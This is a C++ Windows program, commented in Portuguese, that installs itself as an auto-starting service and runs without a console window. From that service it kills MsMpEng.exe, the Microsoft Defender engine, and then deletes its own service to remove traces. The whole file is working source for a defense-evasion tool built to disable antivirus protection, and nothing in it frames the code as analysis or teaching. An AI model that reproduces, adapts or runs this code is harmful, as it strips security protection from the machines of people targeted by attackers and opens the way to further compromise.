#include <Windows.h>
#include <iostream>
#include <TlHelp32.h>
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

// Fun��o para encontrar e matar o processo MsMpEng.exe
void TerminateMsMpEngProcess() {
    // Obter um snapshot dos processos em execu��o
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        std::cout << "Erro ao criar snapshot de processos: " << GetLastError() << std::endl;
        return;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Percorrer os processos para encontrar o MsMpEng.exe
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, L"MsMpEng.exe") == 0) {
                // Encontrou o processo MsMpEng.exe, tenta termin�-lo
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                if (hProcess != NULL) {
                    if (TerminateProcess(hProcess, 0)) {
                        std::cout << "Processo MsMpEng.exe terminado com sucesso!" << std::endl;
                    }
                    else {
                        std::cout << "Erro ao terminar o processo MsMpEng.exe: " << GetLastError() << std::endl;
                    }
                    CloseHandle(hProcess);
                }
                else {
                    std::cout << "Erro ao abrir o processo MsMpEng.exe: " << GetLastError() << std::endl;
                }
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }

    CloseHandle(hProcessSnap);
}

// Fun��o que ser� executada pelo servi�o
void ServiceMain(DWORD argc, LPTSTR* argv) {
    // Aqui executa a fun��o para matar o processo MsMpEng.exe.
    TerminateMsMpEngProcess();


// Desinstalar o servi�o ap�s a conclus�o
SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
if (hSCManager != NULL) {
    SC_HANDLE hService = OpenService(hSCManager, L"MyService", SERVICE_STOP | DELETE);
    if (hService != NULL) {
        // Parar o servi�o antes de exclu�-lo
        SERVICE_STATUS status;
        ControlService(hService, SERVICE_CONTROL_STOP, &status);

        // Excluir o servi�o
        if (DeleteService(hService)) {
            std::wcout << L"Servi�o desinstalado com sucesso!" << std::endl;
        }
        else {
            std::wcout << L"Erro ao excluir o servi�o: " << GetLastError() << std::endl;
        }

        CloseServiceHandle(hService);
    }
    else {
        std::wcout << L"Erro ao abrir o servi�o para exclus�o: " << GetLastError() << std::endl;
    }

    CloseServiceHandle(hSCManager);
}
else {
    std::wcout << L"Erro ao abrir o Service Control Manager para exclus�o: " << GetLastError() << std::endl;
}
}


int main() {
    // Defina informa��es sobre o servi�o
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        { (LPWSTR)L"MyService", (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { NULL, NULL }
    };

    // Abra o Service Control Manager
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (hSCManager == NULL) {
        std::cout << "Erro ao abrir o Service Control Manager: " << GetLastError() << std::endl;
        return 1;
    }

    // Obtenha o caminho completo do execut�vel atual
    wchar_t szPath[MAX_PATH];
    GetModuleFileName(NULL, szPath, MAX_PATH);

    // Verifique se o servi�o j� est� instalado
    SC_HANDLE hService = OpenService(hSCManager, L"MyService", SERVICE_QUERY_CONFIG);
    if (hService == NULL) {
        // Se o servi�o n�o estiver instalado, crie-o
        hService = CreateService(
            hSCManager,
            L"MyService",           // Nome do servi�o
            L"My Service",          // Nome de exibi��o
            SERVICE_ALL_ACCESS,     // Permiss�es de acesso ao servi�o
            SERVICE_WIN32_OWN_PROCESS, // Tipo de servi�o
            SERVICE_AUTO_START,     // Tipo de inicializa��o (autom�tica na inicializa��o)
            SERVICE_ERROR_NORMAL,   // Tipo de erro
            szPath,                 // Caminho do execut�vel
            NULL,
            NULL,
            NULL,
            NULL,
            NULL
        );

        if (hService == NULL) {
            std::cout << "Erro ao criar o servi�o: " << GetLastError() << std::endl;
            CloseServiceHandle(hSCManager);
            return 1;
        }

        std::cout << "Servico instalado com sucesso!" << std::endl;

        // Inicie o servi�o manualmente ap�s cri�-lo
        if (!StartService(hService, 0, NULL)) {
            std::cout << "Erro ao iniciar o servi�o: " << GetLastError() << std::endl;
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCManager);
            return 1;
        }

        std::cout << "Servico iniciado com sucesso!" << std::endl;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);

    // Inicie o servi�o usando o Service Control Manager
    if (!StartServiceCtrlDispatcher(ServiceTable)) {
        std::cout << "Erro ao iniciar o servi�o: " << GetLastError() << std::endl;
        return 1;
    }

    return 0;
}
